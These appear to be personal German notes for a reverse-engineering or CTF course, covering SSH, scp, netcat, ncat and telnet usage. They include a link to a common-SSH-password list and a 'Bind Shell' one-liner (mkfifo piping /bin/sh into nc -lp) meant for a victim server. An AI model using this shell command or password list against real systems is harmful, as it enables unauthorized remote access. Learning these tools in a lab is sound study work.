Beim Nachrichten vom Server ziehen auf Line endings achten
zb telnet haut alle \r raus und übernimmt nur \n
um das zu umgehen zB nc mit flag -C verwenden
großes C ist richtig

### SSH

SSH Connection aufbauen
`ssh <user>@<adress> -p <port>`

Dateien kopieren
`scp -p <destPort> <localFile> <destUser>@<destAdress>:/remote/directory /local/directory`
`-r` für recursive

`scp student@six.reverse-engineering.scenario.cip.institute:/home/student/challenge  /media/sf_Share`

Open SSH Port
Guide: https://www.cyberciti.biz/faq/ufw-allow-incoming-ssh-connections-from-a-specific-ip-address-subnet-on-ubuntu-debian/
Most common SSH passwords
https://gitlab.com/kalilinux/packages/seclists/-/blob/kali/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt

#### ncat
Für ausschließlich IPv6 Listener
`ncat -l6 6900`

### nc
nc Verbindung aufbauen
`nc <ip> <port>`
`-C` Behält line Endings

Auf Port listen
`nc -lp 6900`
`nc -lvnp 6900`

Send files
On your server: `nc -l -p 1234 -q 1 > something.zip < /dev/null`
On your sender client: `cat something.zip | netcat server.ip.here 1234`
Source: https://superuser.com/questions/98089/sending-file-via-netcat

##### Bind Shell
auf meinem Laptop
`nc ip-adr-opfer port-opfer`

Opfer Server
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lp 6900 > /tmp/f`

### Telnet
Benutz ich eigtl nicht
Guide: https://phoenixnap.com/kb/telnet-linux

`telnet ^<targetIP> <targetPort>`